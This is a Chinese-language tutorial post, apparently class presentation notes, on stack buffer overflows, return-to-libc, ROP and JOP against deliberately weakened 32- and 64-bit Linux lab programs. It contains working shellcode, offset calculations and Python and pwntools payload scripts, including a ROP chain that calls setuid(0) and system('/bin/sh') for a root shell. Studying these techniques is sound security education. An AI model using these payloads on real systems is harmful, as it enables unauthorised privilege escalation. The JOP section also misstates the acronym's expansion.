---
title: Linux-Kernel课堂展示-缓冲区溢出、ret2libc、ROP和JOP
abbrlink: 354eb348
date: 2022-11-10 22:43:51
categories:
- linux-kernel
tags:
- 
---

## 缓冲区溢出

### 环境准备

1. 关闭地址随机化，也叫 ASLR

```bash
cat /proc/sys/kernel/randomize_va_space # 查看，0=关闭，1=半随机，2=全随机
sudo sh -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

2. 在 gcc 中关闭栈保护机制和栈不可执行机制，分别使用选项 `-fno-stack-protector` 和 `-z execstack`
3. 我们只考虑 32 位程序，因此，在编译的时候使用 `-m32` 选项指定生成 32 位程序。
4. 将有安全机制的 sh 链接到没有安全机制的 zsh，并且将被攻击的程序设为 setuid 程序。

```bash
sudo ln -sf /bin/zsh /bin/sh
sudo chown root attack
sudo chmod 4755 attack
```

### 基本原理

#### 函数堆栈的结构

对于这样的一个函数，堆栈如下：

```c
void foo(int a, int b) { 
	int x[2];
}
```

![image-20221109140555711](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109140555711.png)

#### shellcode 

我们看下面这个程序，调用了 execve() 函数，运行了 sh，我们可以将其编译得到二进制程序，拿到核心的那段二进制。

```c
int main() {
	char *name[2];
	name[0] = "bin/sh"; name[1] = NULL;
	execve(name[0], name, NULL);
}
```

如下所示：

```c
const char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"；
```

我们可以调用这个二进制代码，就够拿到 root 权限的 shell。

```c
int (*func)() = (int(*)())shellcode;
func();
```

![image-20221109141946175](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109141946175.png)

### 一个缓冲区溢出的实例

#### 被攻击的程序

```c
int bof(char *str)
{
    char buffer[BUF_SIZE];
    // Has a buffer overflow problem 
    strcpy(buffer, str);       
    return 0;
}
```

#### 调试程序得到一些有用的数据

```
gdb-peda$ p &buffer
$1 = (char (*)[100]) 0xffffcaec
gdb-peda$ p $ebp
$2 = (void *) 0xffffcb58
gdb-peda$ p/d 0xffffcb58 - 0xffffcaec
$3 = 108
```

#### 构造字符串将 shellcode 插入合适位置

```python
shellcode= (
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
   "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
   "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

content = bytearray(0x90 for i in range(517)) 

start = 300 
content[start:start + len(shellcode)] = shellcode

ret    = 0xffffcaec + start 
offset = 112

content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little') 
```

#### 执行程序的结果

![image-20221109143129111](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109143129111.png)

## return to libc

对于很多栈不可执行的程序，我们无法调用自己构造的 shellcode。为了对抗不可执行栈，我们需要使用 return-to-libc 攻击。攻击者不需要可执行的栈，甚至不需要 shellcode。return-to-libc 攻击通过将程序的控制权跳转到系统自己的可执行代码，例如在 libc 库中的 system() 函数，来实现攻击。

也就是说，这种攻击方法可以使用于编译时没有 `-z execstack` 选项的程序。

### 准备

1. 被攻击代码：

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define BUF_SIZE 16

int bof(char *str)
{
    char buffer[BUF_SIZE];
    unsigned int *framep;
    asm("movl %%ebp, %0" : "=r" (framep));      
    printf("Address of buffer[] inside bof():  0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof():  0x%.8x\n", (unsigned)framep);
    // Has a buffer overflow problem
    strcpy(buffer, str);   
    return 1;
}

int main(int argc, char **argv)
{
   char input[1000];
   FILE *badfile;
   badfile = fopen("badfile", "r");
   int length = fread(input, sizeof(char), 1000, badfile);
   printf("Address of input[] inside main():  0x%x\n", (unsigned int) input);
   printf("Input size: %d\n", length);
   bof(input);
   return 1;
}
```

2. 调试程序，得到一些 libc 库函数的地址：

```
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e0e360 <system>
gdb-peda$ p exit
$2 = {<text variable, no debug info>} 0xf7e00ec0 <exit>
```

### 得到调用 system 函数的参数

```bash
export MYSHELL=/bin/sh
```

写一个 help 函数，变出出来的可执行文件文件名应该和 retlic 一样长，输出 MYSHELL 的地址。

```c
void main(){
    char* shell = getenv("MYSHELL");
    if (shell)
        printf("%x\n", (unsigned int)shell);
}
// gcc -o prtenv -m32 -g help.c                           
// ./prtenv             
//     ffffdfe7
```

### 实施攻击

我们先随便执行一下 retlic 程序：

```
Address of input[] inside main():  0xffffce00
Input size: 300
Address of buffer[] inside bof():  0xffffcdd0
Frame Pointer value inside bof():  0xffffcde8
```

可以看到 input 的地址和 buffer 的地址和 ebp 的值。并且可以算出 ebp 相对于 buffer 偏移了 24 字节。那么 ret 就是偏移 28 字节。

![image-20221108133512468](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133512468.png)

这样，我们用 system 的地址覆盖了 ret，在 bof 函数退出时就会去执行 system 函数，并且我们把参数放在环境变量中，然后找到了地址，传递给 system 函数，从而 system("/bin/sh") 会被执行。

![image-20221108133828292](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108133828292.png)

可以看到，我们拿到了 root 权限。

## ROP

### 基本概念

ROP 全称为 Return-oriented Programming（面向返回的编程）是一种新型的基于代码复用技术的攻击，攻击者从已有的库或可执行文件中提取指令片段，构成恶意代码。

上面我们已经成功实现了调用 system 库函数。很遗憾的是，我们需要提前将 sh 链接到没有安全措施的 zsh，但是在攻击对方时，很难保证对方机器上安装了 zsh。我们可以看到，上面得到的 shell 的 uid 还是普通用户，euid 才是 root 用户。为了解决 sh 在 uid 和 euid 不相同的情况下放弃特权的情况，我们还需要调用 setuid(0) 将 uid 设为 0。

ROP 技术可以帮我们实现这种连锁（调用 setuid 又调用 system）的调用。

### 函数的序言和后记

对于 32 位程序，函数序言用于为函数准备栈和指针，通常会包含以下 3 条指令：

```assembly
pushl %ebp   	; 保存 ebp 值（它目前指向调用者栈帧）
movl %esp %ebp 	; 让 ebp 指向被调用者的栈帧
subl $N %esp  	; 为局部变量预留空间
```

![image-20221109150443688](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109150443688.png)

函数后记用于恢复栈和寄存器到函数调用以前的状态，通常包含以下 3 条指令：

```assembly
movl %ebp %esp 	; 释放为局部变量开辟的栈空间
popl %ebp 		; 让 ebp 指回调用者函数的栈帧
ret  			; 返回
```

![image-20221109151033473](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109151033473.png)

### 链式调用没有参数的函数

下面考虑从 foo 函数调用 F 函数，我们假设初始时 ebp=X，那么执行 mov 之后 esp=X，执行 pop 时 ebp 得到 esp 地址存储的值，也就是 *X，esp=X+4；再执行 ret 时 esp 继续加 4 变成 X+8。执行 push ebp 时，esp 需要减 4 变成 X+4；执行 mov esp ebp 时 ebp=esp=X+4，也就是 ebp 的值每次都会增加 4。

![image-20221109154136084](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109154136084.png)

我们希望 foo 调用 bar1，那么就把 bar1 的地址放在 foo 的 ebp + 4 的位置，希望 bar1 调用 bar2，那么就把 bar2 的地址放在 bar1 的 ebp + 4 的位置，而 bar1 的 ebp 是 foo 的 ebp + 4，那么就把 bar2 放在 foo 的 ebp + 8 的位置。以此类推...

```c
int foo(char *str) {
    char buffer[100];
    unsigned int *framep;
    asm("movl %%ebp, %0" : "=r"(framep));
    /* print out information for experiment purpose */
    printf("Address of buffer[] inside bof():  0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof():  0x%.8x\n", (unsigned)framep);
    strcpy(buffer, str);
    return 1;
}

void bar() {
    static int i = 1;
    printf("Function foo() is invoked %d times\n", i++);
    return;
}
```

对于上面这个有缓冲区溢出漏洞的 foo，我们希望能够调用 bar 函数 10 次，那么可以这样构造我们的输入：

```python
def tobytes(value):
    return (value).to_bytes(4, byteorder='little')

# 通过 gdb 得到位置
bar_addr = 0x565562d0
exit_addr = 0xf7e00ec0

content = bytearray(0xaa for i in range(112)) # $ebp - &buffer
content += tobytes(0xffffffff) # ebp 的值，不重要

for i in range(10):
    content += tobytes(bar_addr)
content += tobytes(exit_addr)
```

结果如下：

![image-20221109161115660](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109161115660.png)

### 链式调用有参数的函数（跳过序言）

对于调用有参数的函数，ebp + 8 之类的位置需要放参数，不能链式的放函数的地址了。

解决办法就是我们不让被调用函数的序言执行，那么 ebp 就会变成 Y，也就是之前 *ebp 的值，而这个值我们是可以改变的，我们可以设置这个值为 ebp + 0x20，那么就是 ebp 每次增加 0x20 而不是 4 了，这样就有足够的空间让我们填入参数了。

为了跳过函数序言，我们可以不跳转到函数，而是选择跳转到函数序言后面的指令：

![image-20221109162037679](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109162037679.png)

我们就这样这样构造输入：

```python
def tobytes(value):
    return (value).to_bytes(4, byteorder='little')

exit_addr = 0xf7e00ec0
baz_addr = 0x56556316
ebp_foo = 0xffffc9f8

content = bytearray(0xaa for i in range(112))

ebp_next = ebp_foo
for i in range(10):
    ebp_next += 0x20 
    content += tobytes(ebp_next) # 让 ebp 位置的值增加 0x20
    content += tobytes(baz_addr) # 然后 4 个字节是需要调用的函数
    content += tobytes(0xaabbccdd) # 然后是函数参数
    content += b'A' * (0x20 - 12) # 填充 0x20 字节中没用完的
# 调用 exit，可以不要
content += tobytes(0xffffffff)
content += tobytes(exit_addr)
content += tobytes(0xaabbccdd)
```

![image-20221108234902510](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221108234902510.png)

### 链式调用有参数的函数（跳过后记）

现在，库函数都是通过过程链接表（PLT）调用的，即我们不直接跳转到这些函数的入口点；我们需要跳转到 PLT 中的一个入口，它执行连接目标库函数并最终跳转到其入口点的重要步骤。这种机制广泛用于调用动态链接库。因此，如果我们想跳过函数序言，我们必须跳过 PLT 内部所有的中间设置指令，但没有设置，是不可能调用目标函数的。

为了实现跳过后记，我们引入一个 empty() 函数，顾名思义，这是一个空函数。当需要从 A() 函数跳转 B 函数时，我们先从 A() 函数跳转到 empty() 函数，并跳过 empty() 函数的序言（相对于只执行了后记），然后从 empty() 函数跳转到 B() 函数。

从 A() 函数跳转到 empty() 函数跳过序言，ebp 的值从 X 变成 Y，从 empty() 函数跳转到 B() 函数，值会增加 4，那么就是变成 Y + 4。empty() 函数去掉序言，只剩下后记，那么其实就是相当于 A() 函数的后记执行两遍。

![image-20221109181549899](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109181549899.png)

这样，我们就可以调用库函数了：

```python
content = bytearray(0xaa for i in range(112))

# From foo () to the first function
ebp_next = ebp_foo + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret) # 调用 leaveret ，没有函数序言，ebp 从 X 变成 Y，增加 20
content += b'A' * (0x20 - 8)

# printf
for i in range(20):
    # 空函数跳转执行 printf，ebp 增加 4，因此可以链式执行后面的 leaveret 函数
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(printf_addr)
    content += tobytes(leaveret)
    content += tobytes(sh_addr)
    content += b'A' * (0x20 - 16)

# 空函数再次跳转到 exit
content += tobytes(0xffffffff)
content += tobytes(exit_addr)
```

![image-20221109104213067](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109104213067.png)

### 攻击程序

有了上面的基础，就可以构造我们的攻击函数了，我们需要调用 setuid(0) 之后调用 system("/bin/sh")，但是 setuid(0) 的 0 不能通过字符串传进去（strcpy 遇到 \0 就会终止，而 0 是由 4 个 \0 组成的）。因此，我们可以调用 sprintf(char *a, char *b) 将 b 拷贝到 a，单个的 \0 可以从参数 /bin/sh 的末尾拿到。（这个参数是通过环境变量写进去的）。重复执行 sprintf 四次，就可以得到一个 0。

因此，完整的函数调用链是 bof -> sprintf -> sprintf -> sprintf -> sprintf -> setuid -> system -> exit，构造输入如下：

```python
content = bytearray(0xaa for i in range(112))

sprintf_arg1 = ebp_foo + 12 + 5 * 0x20 # setuid 参数的地址
sprintf_arg2 = sh_addr + len("/bin/sh") # \0 的地址

# From foo () to the first function
ebp_next = ebp_foo + 0x20
content += tobytes(ebp_next)
content += tobytes(leaveret)
content += b'A' * (0x20 - 8)

# sprintf
for i in range(4):
    ebp_next += 0x20
    content += tobytes(ebp_next)
    content += tobytes(sprintf_addr)
    content += tobytes(leaveret)
    content += tobytes(sprintf_arg1)
    content += tobytes(sprintf_arg2)
    content += b'A' * (0x20 - 20)
    sprintf_arg1 += 1;

# setuid(0)
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(setuid_addr)
content += tobytes(leaveret)
content += tobytes(0xffffffff)
content += b'A' * (0x20 - 16)

# system("/bin/sh")
ebp_next += 0x20
content += tobytes(ebp_next)
content += tobytes(system_addr)
content += tobytes(leaveret)
content += tobytes(sh_addr)
content += b'A' * (0x20 - 16)

# exit()
content += tobytes(0xffffffff)
content += tobytes(exit_addr)
```

运行结果如下，成功把 uid 也设为了 0：

![image-20221109184334028](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109184334028.png)

## JOP

JOP 全称为 Return-oriented Programming（面向跳转的编程），是代码重用攻击方式的一种。实际上是在代码空间中寻找被称为 gadget 的一连串目标指令，且其以 jmp 结尾。和 ROP 不同之处在于，ROP 在函数返回时才调用另一个函数，JOP 在代码段有 jmp 指令时就可以跳转另一个代码段。

当程序在执行间接跳转或者是间接调用指令时，程序将从指定寄存器中获得其跳转的目的地址，由于这些跳转目的地址保存在寄存器中，而攻击者可以修改栈内容来修改寄存器内容，使得程序中间接跳转和间接调用目的地址能够被攻击者篡改。

当攻击者篡改寄存器内容时，攻击者就可以让程序跳转到攻击者所构建的 gadget 地址处，执行JOP攻击。

### 攻击案例

关闭地址随机化，安装两个 python 包

```bash
sudo sysctl -w kernel.randomize_va_space=0
sudo -H python3 -m pip install ROPgadget
sudo pip install pwn
```

编写含有漏洞的程序并编译：

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void func() {
    char buf[10];
    read(STDIN_FILENO, buf, 20);
}

int main() {
    func();
    printf("Normal return\n");
    return 0;
}
// gcc -fno-stack-protector -o attack attack.c -ldl
```

查看程序使用的动态连接库：

![image-20221109201430419](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109201430419.png)

调用 ROPgadget 得到下面这个两条指令的地址：

![image-20221109201300490](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109201300490.png)

构造 payload ：

```python
from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
proc = process("./attack")

sys_addr = 0x7ffff7e17290
arg_addr = 0x7fffffffefe7
ret_addr = 0x0000000000036174 - libc.symbols['system'] + sys_addr
jmp_addr = 0x00000000000346fd - libc.symbols['system'] + sys_addr

payload = b'a' * 18 + p64(ret_addr) + p64(sys_addr) + p64(jmp_addr) + p64(arg_addr)

proc.send(payload)
proc.interactive()
```

执行攻击：

![image-20221109204254368](https://ceyewan.oss-cn-beijing.aliyuncs.com/typora/image-20221109204254368.png)

